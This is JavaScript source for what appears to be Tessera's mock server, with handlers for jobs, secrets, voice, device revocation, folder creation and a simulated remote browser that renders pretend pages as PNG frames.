    const run = { job_id: job.id, session_id: rec.info.id, started_at: started, outcome: 'running' };
    state.jobRuns = [run, ...(state.jobRuns ?? [])];
    job.runs = (job.runs ?? 0) + 1;
    job.last_run = started;
    job.last_session = rec.info.id;
    job.last_status = 'running';
    delete job.last_end;
    if (job.enabled) {
      const next = nextRun(job.schedule) ?? undefined;
      job.next_run = job.until && next >= job.until ? undefined : next;
    }
    broadcast({ type: 'job_updated', job });
    // Its last run, or none left before its end date: the schedule ends (as the server's run_job).
    const over = scheduleOver(job) ?? (job.enabled && job.until && !job.next_run ? 'no run comes before its end date' : null);
    if (job.enabled && over) endSchedule(job, over);
    beginTurn(rec, [{ type: 'text', text: job.prompt || `Run job "${job.name}"` }], {
      author: `job:${job.id}`, // the job's standing instructions, not the user's words
      scenario: scenarioDefault,
    });
    return rec.info;
  },
  list_job_runs(p) {
    const id = need(p, 'id');
    return (state.jobRuns ?? []).filter((r) => r.job_id === id).slice(0, 50);
  },
  // `mock_job_end { session_id }` (tests): the job's own run says its goal is met (`schedule end`).
  mock_job_end(p) {
    const run = (state.jobRuns ?? []).find((r) => r.session_id === need(p, 'session_id'));
    if (!run) throw badRequest('Only a scheduled job\'s own run can end its schedule');
    const job = state.jobs.find((j) => j.id === run.job_id);
    if (!job) throw notFound('This run\'s job was deleted already.');
    return endSchedule(job, p.reason ? `its goal was met (${p.reason})` : 'a run said its goal was met');
  },

  get_memory() {
    return state.memory;
  },
  set_memory(p) {
    const target = oneOf(need(p, 'target'), ['memory', 'user'], 'memory target');
    const content = String(need(p, 'content'));
    const limit = target === 'memory' ? state.memory.memory_limit : state.memory.user_limit;
    const len = [...content].length;
    if (len > limit) throw badRequest(`${target === 'memory' ? 'Memory' : 'User profile'} is ${len} characters; the limit is ${limit}`);
    state.memory[target] = content;
    return state.memory;
  },
  list_skills(p) {
    const cwd = p.cwd ? expandHome(String(p.cwd)) : null;
    return state.skills.filter((s) => s.source !== 'project' || !cwd || cwd.startsWith(`${HOME}/projects/tessera`));
  },

  read_skill(p) {
    const name = String(need(p, 'name'));
    const sk = state.skills.find((s) => s.name === name);
    if (!sk) throw notFound(`no skill \`${name}\``);
    return `---\nname: ${sk.name}\ndescription: ${sk.description}\n---\n\n1. Check the working tree is clean: \`git status --short\`.\n2. Do the thing for ${sk.name}.\n3. Verify and report what changed.\n`;
  },
  delete_skill(p) {
    const name = String(need(p, 'name'));
    const i = state.skills.findIndex((s) => s.name === name);
    if (i < 0) throw notFound(`no skill \`${name}\``);
    state.skills.splice(i, 1);
    return null;
  },

  list_devices(_p, conn) {
    return state.devices.map((d) => ({ ...d, current: d.id === conn.deviceId }));
  },
  revoke_device(p) {
    const id = need(p, 'id');
    const dev = state.devices.find((d) => d.id === id);
    if (!dev) throw notFound(`Device not found: ${id}`);
    state.devices = state.devices.filter((d) => d !== dev);
    for (const [token, dev2] of tokenDevices) if (dev2 === id) revokedTokens.add(token);
    const victims = [...clients].filter((c) => c.deviceId === id);
    for (const c of victims) revokedTokens.add(c.token);
    // Its private chats go with it (nobody else may ever see them).
    for (const [sid, rec] of [...state.sessions]) {
      if (rec.info.private && rec.owner === id) {
        rec.turn?.cancel();
        state.sessions.delete(sid);
        forgetNotifications(sid);
        broadcast({ type: 'session_removed', session_id: sid });
      }
    }
    setTimeout(() => victims.forEach((c) => c.close(1008, 'device revoked')), 50); // after the response goes out
    return null;
  },
  create_pairing() {
    // Real servers issue 8 digits as 1234-5678 plus the key fingerprint devices show after pairing.
    let code;
    do code = `${String(randInt(0, 9999)).padStart(4, '0')}-${String(randInt(0, 9999)).padStart(4, '0')}`; while (state.pairingCodes.has(code));
    const pairing = { code, expires_at: now() + 10 * MIN, fingerprint: MOCK_FINGERPRINT, link: pairLink(code) };
    state.pairingCodes.set(code.replace(/\D/g, ''), pairing);
    return pairing;
  },

  get_remote_access() {
    return { urls: [...state.remote.urls], header_names: state.remote.headers.map(([k]) => k) };
  },
  set_remote_access(p) {
    const urls = strings(need(p, 'urls'));
    for (const u of urls) if (!/^https?:\/\/\S+$/i.test(u)) throw badRequest(`Not a URL: ${u}`);
    state.remote.urls = urls;
    const checkName = (k) => {
      if (!/^[A-Za-z0-9-]+$/.test(k)) throw badRequest(`Invalid header name: ${k}`);
      return k;
    };
    if (p.headers != null) { // the whole set (omitted keeps them)
      if (typeof p.headers !== 'object' || Array.isArray(p.headers)) throw badRequest('headers must be an object');
      state.remote.headers = Object.entries(p.headers).map(([k, v]) => [checkName(k), String(v)]);
    }
    // One by one: removals first, then additions/replacements (names compare case-insensitively).
    const remove = Array.isArray(p.remove_headers) ? p.remove_headers.map(String) : [];
    if (remove.length) state.remote.headers = state.remote.headers.filter(([k]) => !remove.some((r) => r.toLowerCase() === k.toLowerCase()));
    if (p.add_headers != null) {
      if (typeof p.add_headers !== 'object' || Array.isArray(p.add_headers)) throw badRequest('add_headers must be an object');
      for (const [k, v] of Object.entries(p.add_headers)) {
        checkName(k);
        if (!String(v ?? '')) throw badRequest(`The value for ${k} is empty`);
        state.remote.headers = state.remote.headers.filter(([x]) => x.toLowerCase() !== k.toLowerCase());
        state.remote.headers.push([k, String(v)]);
      }
    }
    broadcast({ type: 'server_route_changed' });
    return handlers.get_remote_access();
  },

  get_web_search() {
    const w = state.webSearch;
    return { search: w.search, ...(w.search === 'searxng' && w.searxng_url ? { searxng_url: w.searxng_url } : {}), header_names: [...w.headers.keys()].sort(), keys: [...w.keys.keys()].sort() };
  },
  set_search_key(p) { // write-only; "" removes it
    const provider = oneOf(String(need(p, 'provider')).trim().toLowerCase(), ['brave', 'tavily'], 'search provider');
    const key = String(p.key ?? '').trim();
    if (key) state.webSearch.keys.set(provider, key);
    else state.webSearch.keys.delete(provider);
    return handlers.get_web_search();
  },
  save_web_search(p) {
    const search = String(need(p, 'search')).trim().toLowerCase();
    if (search !== 'duckduckgo' && search !== 'searxng') throw badRequest('search must be `duckduckgo` or `searxng`');
    const url = typeof p.searxng_url === 'string' ? p.searxng_url.trim().replace(/\/+$/, '') : '';
    if (search === 'searxng' && !/^https?:\/\/[^\s/]+\S*$/i.test(url)) throw badRequest('SearXNG needs an http(s) URL');
    if (p.headers != null) { // omitted keeps the stored headers, {} clears them
      if (typeof p.headers !== 'object' || Array.isArray(p.headers)) throw badRequest('headers must be an object');
      state.webSearch.headers = new Map(Object.entries(p.headers).map(([k, v]) => [k.trim(), String(v ?? '').trim()]).filter(([k]) => k));
    }
    state.webSearch.search = search;
    state.webSearch.searxng_url = url || null;
    return handlers.get_web_search();
  },

  list_secrets() {
    return [...state.secrets.keys()].sort().map(secretInfo);
  },
  /** auth.rs set_secret_title: only the title changes. */
  set_secret_title(p) {
    const name = String(need(p, 'name')).trim();
    const s = state.secrets.get(name);
    if (!s) throw badRequest(`there is no secret ${name}`);
    const title = oneLine(String(p.title ?? '').trim(), 200);
    if (!title) throw badRequest('give it a title');
    s.description = title;
    return secretInfo(name);
  },
  suggest_secret_titles: () => suggestTitles(),
  /** The old API: a plain token (auth.rs set_secret → save_secret as a token, asking first, any host). */
  set_secret(p) {
    const value = String(need(p, 'value'));
    if (!value) throw badRequest('the secret value is empty');
    saveSecret({ name: need(p, 'name'), kind: 'token', fields: { value } });
    return null;
  },
  save_chat_secret(p) {
    const rec = getRec(p);
    const security = settingsState().security;
    if (!security.save_secrets_from_chat || rec.info.private) throw badRequest('Password entry is not available to this chat.');
    const e = rec.entries.find((e) => e.kind === 'tool_result' && e.tool === 'save_secret' && e.call_id === p.call_id && !e.is_error);
    const entry = e?.details?.secret_entry;
    if (!entry || entry.saved) throw badRequest('No unsaved secure entry card for this call.');
    const fields = p.fields ?? {};
    if (Object.keys(fields).some((k) => !(entry.kind === 'login' ? ['username', 'password', 'url'] : ['value']).includes(k))) throw badRequest('Invalid fields');
    if (!fields[entry.kind === 'login' ? 'password' : 'value']) throw badRequest('Fill in the key or login password.');
    if (/claude|sk-ant-(oat|sid)/i.test(`${entry.name} ${entry.title} ${fields.url ?? ''}`) || Object.values(fields).some((v) => /sk-ant-(oat|sid)/.test(v))) throw badRequest('Claude sign-in belongs to your own Claude CLI.');
    if (state.secrets.has(entry.name)) throw badRequest('Name is taken');
    const swaps = Object.entries(fields).filter(([f, v]) => f !== 'url' && v.length >= 3).map(([f, v]) => [v, entry.kind === 'token' ? `$${entry.name}` : `$${entry.name}_${f.toUpperCase()}`]);
    const changed = [];
    for (const item of rec.entries) {
      const before = JSON.stringify(item);
      let after = before;
      for (const [v, variable] of swaps) after = after.split(v).join(variable);
      if (after !== before) { Object.assign(item, JSON.parse(after)); changed.push(item); }
    }
    if (changed.length) broadcast({ type: 'entries_changed', session_id: rec.info.id, entries: changed });
    saveSecret({ name: entry.name, kind: entry.kind, description: entry.title, fields });
    if (p.chat_only || security.secret_saving !== 'auto') {
      state.secrets.get(entry.name).chat = rec.info.id;
      state.secrets.get(entry.name).origin = 'chat';
    }
    entry.saved = true;
    broadcast({ type: 'entries_changed', session_id: rec.info.id, entries: [e] });
    addEntry(rec, changed.length
      ? NOTICE('warning', "Saved securely in Tessera. If this password was sent as plain text earlier, it stays in Claude Code's own history, which Tessera never edits. The next Claude turn starts from Tessera's sanitized history.")
      : NOTICE('info', 'Saved securely in Tessera.'));
    return null;
  },
  save_secret(p) {
    const kept = state.secrets.get(String(need(p, 'name')))?.chat;
    if (kept && p.new_name != null && String(p.new_name).trim() && String(p.new_name).trim() !== p.name) {
      throw badRequest(`${p.name} is kept for one chat only: save it to Passwords & keys first, then rename it`);
    }
    return saveSecret({ ...p, name: need(p, 'name') });
  },
  delete_secret(p) {
    const name = String(need(p, 'name'));
    // One kept for a chat: its card there says it's gone (engine/security.rs).
    const chat = state.secrets.get(name)?.chat;
    if (!state.secrets.delete(name)) throw notFound(`No secret named ${name}`);
    if (chat) settingsSettle(state.sessions.get(chat), name, 'forget');
    return null;
  },
  /** Tests only: whether a stored value equals `value` (true/false; never the value). */
  mock_secret_check(p) {
    const s = state.secrets.get(String(need(p, 'name')));
    if (!s) throw notFound('no such secret');
    const field = String(p.field ?? 'value');
    return (field === 'value' ? s.value : s.fields[field]) === String(p.value);
  },

  get_voice() {
    return { ...state.voice, has_key: !!state.voiceKey };
  },
  async save_voice(p) {
    if (state.voiceSaveDelay) await new Promise((r) => setTimeout(r, state.voiceSaveDelay));
    const c = need(p, 'config');
    const engine = c.engine || (c.enabled ? 'service' : state.voice.engine === 'service' ? 'auto' : state.voice.engine);
    oneOf(engine, ['auto', 'device', 'server', 'openai', 'service', 'off'], 'voice engine');
    if (engine === 'openai' && !state.voice.openai_key) throw badRequest('Save your OpenAI API key in Passwords & keys first');
    if (engine === 'service' && (!c.enabled || !/^https?:\/\//.test(c.base_url))) throw badRequest('Set up a transcription service first');
    if (typeof p.api_key === 'string') state.voiceKey = p.api_key.trim() || null;
    const { server, openai_key, kept, kept_bytes } = state.voice;
    state.voice = { ...state.voice, ...c, engine, server, openai_key, kept, kept_bytes, has_key: !!state.voiceKey };
    state.serverInfo.voice_engine = engine;
    state.serverInfo.voice = engine === 'service' ? !!c.enabled : engine === 'openai' ? openai_key : ['auto', 'server'].includes(engine) && server.listen;
    return state.voice;
  },
  install_voice() {
    if (state.voice.engine === 'off') throw badRequest('Voice is off');
    state.voiceRequests.push({ method: 'install_voice' });
    const server = state.voice.server;
    server.state = 'installing'; server.total_bytes = server.download_bytes;
    setTimeout(() => { server.state = 'ready'; server.listen = server.speak = true; server.done_bytes = server.total_bytes; server.download_bytes = 0; server.voices[0].installed = true; }, 250);
    return state.voice;
  },
  delete_voice_recordings() { state.voice.kept = state.voice.kept_bytes = 0; return state.voice; },
  mock_voice(p) {
    if (p.openai_key !== undefined) state.voice.openai_key = !!p.openai_key;
    if (p.live !== undefined) state.voice.server.live = !!p.live;
    return { config: state.voice, requests: state.voiceRequests };
  },
  async transcribe(p) {
    const engine = mockVoiceRoute(p.engine);
    if (p.partial && engine !== 'server') throw badRequest('Only private engines support live words');
    const audio = String(need(p, 'audio')), mime = String(need(p, 'mime'));
    const bytes = Buffer.from(audio, 'base64');
    if (bytes.length < 200) throw badRequest('The recording is empty');
    if (engine === 'server' && !state.voice.server.listen) throw badRequest('Download the speech engines first');
    state.voiceRequests.push({ method: 'transcribe', engine, partial: !!p.partial, mime, wav: bytes.subarray(0, 4).toString() === 'RIFF', bytes: bytes.length });
    if (state.voice.keep_audio && !p.partial) { state.voice.kept++; state.voice.kept_bytes += bytes.length; }
    await new Promise((r) => setTimeout(r, p.partial ? 50 : 200));
    return { text: 'Please tell me a short story about the moon.', engine };
  },
  async speak(p) {
    let engine = mockVoiceRoute(p.engine);
    if (engine === 'service') engine = 'server';
    if (engine === 'server' && !state.voice.server.speak) throw badRequest('Download the voice first');
    state.voiceRequests.push({ method: 'speak', engine, chars: String(p.text).length });
    const bytes = Buffer.alloc(44 + 32000); bytes.write('RIFF'); bytes.writeUInt32LE(bytes.length - 8, 4); bytes.write('WAVEfmt ', 8); bytes.writeUInt32LE(16, 16); bytes.writeUInt16LE(1, 20); bytes.writeUInt16LE(1, 22); bytes.writeUInt32LE(16000, 24); bytes.writeUInt32LE(32000, 28); bytes.writeUInt16LE(2, 32); bytes.writeUInt16LE(16, 34); bytes.write('data', 36); bytes.writeUInt32LE(32000, 40);
    return { audio: bytes.toString('base64'), mime: 'audio/wav', ms: 1000 };
  },
  cancel_voice(p) { state.voiceRequests.push({ method: 'cancel_voice', operation: need(p, 'operation') }); return null; },
  list_dir(p) {
    let raw = String(need(p, 'path')).trim() || HOME;
    raw = expandHome(raw);
    if (!raw.startsWith('/')) raw = path.posix.join(HOME, raw);
    const dir = path.posix.normalize(raw).replace(/(.)\/+$/, '$1');
    const children = FS.get(dir);
    if (!children) {
      if (FS.get(path.posix.dirname(dir))?.get(path.posix.basename(dir)) === false) throw badRequest(`Not a directory: ${dir}`);
      throw notFound(`No such directory: ${dir}`);
    }
    return [...children]
      .map(([name, is_dir]) => ({ name, path: dir === '/' ? `/${name}` : `${dir}/${name}`, is_dir }))
      .sort((a, b) => (a.is_dir !== b.is_dir ? (a.is_dir ? -1 : 1) : a.name.toLowerCase() < b.name.toLowerCase() ? -1 : a.name.toLowerCase() > b.name.toLowerCase() ? 1 : 0));
  },
  // engine.rs create_dir ("New folder" in the folder picker): one plain-named folder inside an existing one.
  // A plain name only (no slash, `.`/`..`, control or look-alike characters, at most 255 bytes), a full
  // parent that exists and isn't Tessera's own, never over something already there (conflict).
  create_dir(p) {
    const name = String(need(p, 'name')).trim();
    const hidden = /[\u200B-\u200F\u202A-\u202E\u2060-\u2064\u2066-\u2069\uFEFF]/;
    if (!name) throw badRequest('Give the folder a name.');
    if (name === '.' || name === '..') throw badRequest("That isn't a name a folder can have.");
    if (/[/\\]/.test(name)) throw badRequest("A folder's name can't hold a slash. To make a folder inside another, open that one first.");
    if (/[\u0000-\u001F\u007F-\u009F]/.test(name) || hidden.test(name)) throw badRequest("A folder's name can't hold invisible or control characters.");
    if (Buffer.byteLength(name) > 255) throw badRequest('That name is too long; use a shorter one.');
    const raw = String(need(p, 'parent')).trim();
    if (!(raw === '~' || raw.startsWith('~/') || raw.startsWith('/'))) throw badRequest('Choose where to make it first (a full path, like /home/you).');
    const dir = path.posix.normalize(expandHome(raw)).replace(/(.)\/+$/, '$1');
    const kids = FS.get(dir);
    if (!kids) throw badRequest(`There is no folder ${raw}.`);
    if (SETTINGS_PROTECTED.some((r) => dir === r || dir.startsWith(`${r}/`))) throw badRequest("That is inside Tessera's own data or settings; folders for agents go elsewhere.");
    if (kids.has(name)) throw new RpcError('conflict', `${kids.get(name) ? 'A folder' : 'A file'} called ${name} is already in ${raw}.`);
    kids.set(name, true);
    const made = dir === '/' ? `/${name}` : `${dir}/${name}`;
    FS.set(made, new Map());
    return { name, path: made, is_dir: true };
  },
};

// ─── APP-WEB: the remote browser (Browser* protocol, contract 3 §1) ─────────
// No Chromium here: each url/local board gets a pretend tab whose page is
// drawn as a PNG (a coloured header, a link, a text field, a button that
// asks a question, and rows of "text" that scroll). Frames go only to
// connections attached to the board, one at a time: the next after
// `browser_ack`. Input is logged (GET /__mock/browser) and acted on:
//   link (y 80–120) → navigates to <url>/next · field (y 140–184) → focus
//   (BrowserFocus editable; input_type "email" when the URL says email) ·
//   typing shows as a bar · Enter submits (?q=…) · button (y 200–240) →
//   a confirm dialog (BrowserDialog) · wheel/touch drag scroll the rows ·
//   back/forward/reload/stop/zoom work on a history.
// The `browser` agent tool: "go to example.com", "open https://… in the
// browser", "browse …" opens a tab beside the chat (one tile), looks at it
// (snapshot) and clicks.
const BROWSER = {
  tabs: new Map(),        // board id → tab
  attached: new Map(),    // board id → Map<WsConn, { inflight: number|null, dirty: boolean }>
  log: [],                // { board_id, event } (input), { board_id, nav }, { board_id, dialog: answer }
  frames: 0,
  acks: 0,
};
const tabUrlOf = (b) => (b.content.type === 'local' ? `http://127.0.0.1:${b.content.port}${b.content.path}` : b.content.url);
function browserTab(boardId) {
  let t = BROWSER.tabs.get(boardId);
  if (t) return t;
  const b = state.boards.get(boardId);
  if (!b || (b.content.type !== 'url' && b.content.type !== 'local')) throw notFound(`no web view \`${boardId}\``);
  const url = tabUrlOf(b);
  t = { board_id: boardId, history: [url], index: 0, loading: false, zoom: 1, scroll: 0, focus: false, text: '', mark: null, size: { w: 800, h: 600, dpr: 1, mobile: false }, frame: 0 };
  BROWSER.tabs.set(boardId, t);
  return t;
}
const tabUrl = (t) => t.history[t.index];
function tabTitle(t) {
  try { const u = new URL(tabUrl(t)); return (u.host.replace(/^www\./, '') + (u.pathname === '/' ? '' : u.pathname)).slice(0, 60); } catch { return tabUrl(t); }
}
// `check`: the page looks like a site's "prove you're a person" check (engine tab.rs FOCUS_JS); a page whose
// address mentions "challenge" or "captcha" does here, and `mock_browser_check { board_id, check }` sets it.
const tabInfo = (t) => ({ board_id: t.board_id, tab_ids: t.tab_ids ?? [], url: tabUrl(t), title: tabTitle(t), loading: t.loading, can_go_back: t.index > 0, can_go_forward: t.index < t.history.length - 1, zoom: t.zoom, favicon: null, ...(t.file_chooser ? { file_chooser: t.file_chooser, file_multiple: !!t.file_multiple } : {}), ...((t.check ?? /challenge|captcha/i.test(tabUrl(t))) ? { check: true } : {}) });
function tabChanged(t) {
  broadcast({ type: 'browser_state', tab: tabInfo(t) });
  pushFrame(t.board_id);
}
/** engine: the board follows the tab's address (no version bump for mere navigation). */
function followUrl(t) {
  const b = state.boards.get(t.board_id);
  if (!b || b.content.type !== 'url') return;
  const url = tabUrl(t);
  if (b.content.url === url) return;
  const board = { ...b, content: { type: 'url', url } };
  state.boards.set(b.id, board);
  broadcast({ type: 'board_updated', board });
}
function navigate(t, url, push = true) {
  if (push) {
    t.history = t.history.slice(0, t.index + 1);
    t.history.push(url);
    t.index = t.history.length - 1;
  }
  t.loading = true;
  t.scroll = 0;
  t.focus = false;
  delete t.check; // as the engine: a new page is looked at afresh
  delete t.file_chooser;
  t.text = '';
  followUrl(t);
  tabChanged(t);
  sendFocus(t);
  setTimeout(() => {
    t.loading = false;
    tabChanged(t);
  }, 220);
}
function sendFocus(t) {
  const conns = BROWSER.attached.get(t.board_id);
  if (!conns) return;
  const input_type = /email/i.test(tabUrl(t)) ? 'email' : /password/i.test(tabUrl(t)) ? 'password' : 'text';
  for (const c of conns.keys()) if (clients.has(c)) c.send({ event: { type: 'browser_focus', board_id: t.board_id, editable: t.focus, input_type } });
}
function sendDialog(t, d) {
  t.dialog = d;
  const conns = BROWSER.attached.get(t.board_id);
  for (const c of conns?.keys() ?? []) if (clients.has(c)) c.send({ event: { type: 'browser_dialog', board_id: t.board_id, ...d } });
}
/** Draw the pretend page at the tab's viewport (CSS px). */
function renderTab(t) {
  const w = Math.max(16, Math.min(1600, Math.round(t.size.w)));
  const h = Math.max(16, Math.min(2000, Math.round(t.size.h)));
  const raw = Buffer.alloc((w * 3 + 1) * h, 255);
  for (let y = 0; y < h; y++) raw[y * (w * 3 + 1)] = 0;
  const fill = (x0, y0, x1, y1, [r, g, b]) => {
    x0 = Math.max(0, Math.round(x0)); y0 = Math.max(0, Math.round(y0));
    x1 = Math.min(w, Math.round(x1)); y1 = Math.min(h, Math.round(y1));
    for (let y = y0; y < y1; y++) {
      let o = y * (w * 3 + 1) + 1 + x0 * 3;
      for (let x = x0; x < x1; x++) { raw[o++] = r; raw[o++] = g; raw[o++] = b; }
    }
  };
  const z = t.zoom;
  let hash = 0;
  for (const ch of tabUrl(t)) hash = (hash * 31 + ch.charCodeAt(0)) >>> 0;
  const hue = [[40 + (hash % 120), 90 + ((hash >> 8) % 100), 150 + ((hash >> 16) % 90)]][0];
  fill(0, 0, w, 56 * z, hue); // header
  fill(16, 80 * z, w - 16, 120 * z, [60, 110, 220]); // link
  fill(16, 140 * z, w - 16, 184 * z, t.focus ? [230, 160, 40] : [170, 170, 170]); // field border
  fill(18, 142 * z, w - 18, 182 * z, [255, 255, 255]);
  if (t.text) fill(26, 154 * z, Math.min(w - 26, 26 + t.text.length * 8 * z), 170 * z, [30, 30, 30]); // typed text
  fill(16, 200 * z, Math.min(w - 16, 180), 240 * z, [215, 110, 50]); // button
  for (let i = 0; i < 60; i++) {
    const y = (260 + i * 28) * z - t.scroll;
    if (y > h) break;
    if (y + 12 * z < 0) continue;
    fill(16, y, 16 + ((w - 32) * (0.5 + ((hash >> (i % 24)) % 50) / 100)), y + 12 * z, [205, 205, 205]);
  }
  if (t.loading) fill(0, 0, w * 0.4, 3, [230, 160, 40]);
  if (t.mark) fill(t.mark.x - 3, t.mark.y - 3, t.mark.x + 3, t.mark.y + 3, [220, 30, 30]);
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2;
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), pngChunk('IHDR', ihdr), pngChunk('IDAT', zlib.deflateSync(raw, { level: 1 })), pngChunk('IEND', Buffer.alloc(0))]);
  return { mime: 'image/png', data: png.toString('base64'), width: w, height: h };
}
/** A new picture for every attached connection: now if it acknowledged the last one, else once it does. */
function pushFrame(boardId) {
  const conns = BROWSER.attached.get(boardId);
  const t = BROWSER.tabs.get(boardId);
  // On a machine's screen (`browser_show_on_screen`): its browser for web views waits.
  if (!conns || !t || state.onScreen?.has(boardId)) return;
  let pic = null;
  for (const [c, s] of conns) {
    if (!clients.has(c)) { conns.delete(c); continue; }
    if (s.inflight != null) { s.dirty = true; continue; }
    pic ??= renderTab(t);
    s.inflight = ++t.frame;
    s.dirty = false;
    BROWSER.frames++;
    c.send({ event: { type: 'browser_frame', board_id: boardId, frame: s.inflight, ...pic } });
  }
}
function browserInput(t, ev) {
  const z = t.zoom;
  const hit = (y) => (y >= 80 * z && y <= 120 * z ? 'link' : y >= 140 * z && y <= 184 * z ? 'field' : y >= 200 * z && y <= 240 * z ? 'button' : null);
  const click = (x, y) => {
    t.mark = { x, y };
    const what = hit(y);
    if (what === 'link') return navigate(t, tabUrl(t).replace(/\/?$/, '/next'));
    const was = t.focus;
    t.focus = what === 'field';
    if (t.focus !== was) sendFocus(t);
    if (what === 'button') sendDialog(t, { kind: 'confirm', message: 'Leave this page for the next one?', default: null });
    pushFrame(t.board_id);
  };
  switch (ev?.type) {
    case 'mouse':
      if (ev.kind === 'down' && ev.button === 'left') click(ev.x, ev.y);
      else if (ev.kind === 'wheel') { t.scroll = Math.max(0, t.scroll + Number(ev.dy || 0)); pushFrame(t.board_id); }
      return;
    case 'touch': {
      const p = ev.points?.[0];
      if (ev.kind === 'start' && p) t.touch = { x: p.x, y: p.y, moved: false };
      else if (ev.kind === 'move' && p && t.touch) {
        const dy = t.touch.y - p.y;
        if (Math.abs(dy) > 4) t.touch.moved = true;
        t.scroll = Math.max(0, t.scroll + dy);
        t.touch.y = p.y;
        pushFrame(t.board_id);
      } else if (ev.kind === 'end' && t.touch) {
        if (!t.touch.moved) click(t.touch.x, t.touch.y);
        t.touch = null;
      } else if (ev.kind === 'cancel') t.touch = null;
      return;
    }
    case 'key':
      if (ev.kind !== 'down' || !t.focus) return;
      if (ev.key === 'Backspace') t.text = [...new Intl.Segmenter().segment(t.text)].slice(0, -1).map((g) => g.segment).join('');
      else if (ev.key === 'Enter') return navigate(t, `${tabUrl(t).split('?')[0]}?q=${encodeURIComponent(t.text)}`);
      else if (ev.text && !(ev.modifiers & 6)) t.text += ev.text;
      pushFrame(t.board_id);
      return;
    case 'text':
      if (t.focus) { t.text += String(ev.text ?? ''); pushFrame(t.board_id); }
      return;
  }
}
for (const [name, fn] of Object.entries({
  browser_attach(p, conn) {
    const id = String(need(p, 'board_id'));
    const t = browserTab(id);
    t.size = { w: Number(p.width) || 800, h: Number(p.height) || 600, dpr: Number(p.dpr) || 1, mobile: !!p.mobile };
    let conns = BROWSER.attached.get(id);
    if (!conns) BROWSER.attached.set(id, (conns = new Map()));
    // Attaching again (a new size) starts the frames afresh.
    conns.set(conn, { inflight: null, dirty: false });
    setTimeout(() => {
      pushFrame(id);
      if (t.focus) sendFocus(t);
      // An open dialog is shown to a device that attaches meanwhile.
      if (t.dialog && clients.has(conn)) conn.send({ event: { type: 'browser_dialog', board_id: id, ...t.dialog } });
    }, 10);
    return tabInfo(t);
  },
  browser_detach(p, conn) {
    BROWSER.attached.get(String(need(p, 'board_id')))?.delete(conn);
    return null;
  },
  browser_ack(p, conn) {
    const id = String(need(p, 'board_id'));
    const s = BROWSER.attached.get(id)?.get(conn);
    BROWSER.acks++;
    if (s && s.inflight === Number(p.frame)) {
      s.inflight = null;
      if (s.dirty) pushFrame(id);
    }
    return null;
  },
  browser_input(p) {
    const id = String(need(p, 'board_id'));
    const t = browserTab(id);
    BROWSER.log.push({ board_id: id, event: p.event });
    if (BROWSER.log.length > 2000) BROWSER.log.splice(0, 500);
    browserInput(t, p.event);
    return null;
  },
  browser_nav(p) {
    const id = String(need(p, 'board_id'));
    const t = browserTab(id);
    const a = p.action ?? {};
    BROWSER.log.push({ board_id: id, nav: a });
    switch (a.type) {
      case 'go': {
        const c = checkBoardContent({ type: 'url', url: a.url });
        navigate(t, c.url);
        break;
      }
      case 'back': if (t.index > 0) { t.index--; navigate(t, tabUrl(t), false); } break;
      case 'forward': if (t.index < t.history.length - 1) { t.index++; navigate(t, tabUrl(t), false); } break;
      case 'reload': navigate(t, tabUrl(t), false); break;
      case 'stop': t.loading = false; tabChanged(t); break;
      case 'zoom': t.zoom = Math.max(0.25, Math.min(5, Number(a.factor) || 1)); tabChanged(t); break;
      default: throw badRequest(`unknown browser action \`${a.type}\``);
    }
    return tabInfo(t);
  },
  browser_upload(p) {
    const t=browserTab(p.board_id);
    if(t.file_chooser!==p.chooser) throw badRequest('that file chooser closed');
    const a=p.action;
    BROWSER.uploads ??= new Map();
    if(a.type==='start') {
      const total=a.files.reduce((n,f)=>n+f.size,0);
      if(total>200*1024*1024||a.files.some(f=>f.name.includes('/')||f.name.includes('\\\\')))throw badRequest('bad selected files');
      const id=hex();BROWSER.uploads.set(id,{id:p.board_id,chooser:p.chooser,total,received:0});
      BROWSER.log.push({board_id:p.board_id,upload:'start',total});return {upload:id,received:0};
    }
    const s=BROWSER.uploads.get(a.upload);
    if(!s||s.id!==p.board_id||s.chooser!==p.chooser)throw badRequest('that upload expired');
    if(a.type==='chunk') {const n=Buffer.from(a.data,'base64').length;if(n>256*1024||s.received+n>s.total)throw badRequest('chunk too large');s.received+=n;BROWSER.log.push({board_id:p.board_id,upload:'chunk',bytes:n});return {received:s.received};}
    BROWSER.uploads.delete(a.upload);
    if(a.type==='finish') {if(s.received!==s.total)throw badRequest('incomplete upload');delete t.file_chooser;tabChanged(t);}
    BROWSER.log.push({board_id:p.board_id,upload:a.type});return {received:s.received};
  },
  browser_new_tab(p) {
    const from = state.boards.get(p.board_id);
    if (!from) throw notFound('no web view');
    const b = showBoard(from.session_id, { title: '', content: { type: 'url', url: p.url }, byUser: true }, 'none');
    const t = browserTab(p.board_id), next = browserTab(b.id);
    const ids = [...(t.tab_ids ?? [p.board_id]), b.id];
    for (const id of ids) { const t = browserTab(id); t.tab_ids = ids; tabChanged(t); }
    return b;
  },
  browser_page(p) {
    const t = browserTab(String(need(p, 'board_id')));
    BROWSER.log.push({ board_id: t.board_id, page: p.action });
    if (p.action.type === 'print_pdf') return { text: 'PDF ready in the chat downloads.' };
    if (p.action.type === 'find') {
      const result = { text: '', found: p.action.text !== 'missing-word' };
      return p.action.text === 'T12-delayed' ? new Promise((resolve) => later(500, () => resolve(result))) : result;
    }
    if (p.action.type === 'context') return { text: 'Homework selection', link: 'https://example.test/homework' };
    return { text: 'Homework selection' };
  },
  mock_file_chooser(p) {
    const t = browserTab(String(need(p, 'board_id')));
    t.file_chooser = `chooser_${hex()}`;
    t.file_multiple = !!p.multiple;
    tabChanged(t);
    return null;
  },
  browser_choose_files(p) {
    const t = browserTab(String(need(p, 'board_id')));
    if (!t.file_chooser || t.file_chooser !== p.chooser) throw badRequest('that file chooser closed');
    BROWSER.log.push({ board_id: t.board_id, chooser: p.chooser, files: p.files });
    delete t.file_chooser;
    tabChanged(t);
    return null;
  },
  browser_dialog_answer(p) {
    const id = String(need(p, 'board_id'));
    const t = browserTab(id);
    BROWSER.log.push({ board_id: id, dialog: { accept: !!p.accept, text: p.text ?? null } });
    if (!t.dialog) throw badRequest('no dialog is open in this tab');
    t.dialog = null;
    broadcast({ type: 'browser_dialog_closed', board_id: id });
    if (p.accept) navigate(t, tabUrl(t).replace(/\/?$/, '/left'));
    return null;
  },
})) handlers[name] = fn;

// ─── AGENT-TILES: the agent browses in background tabs ─────────────────────
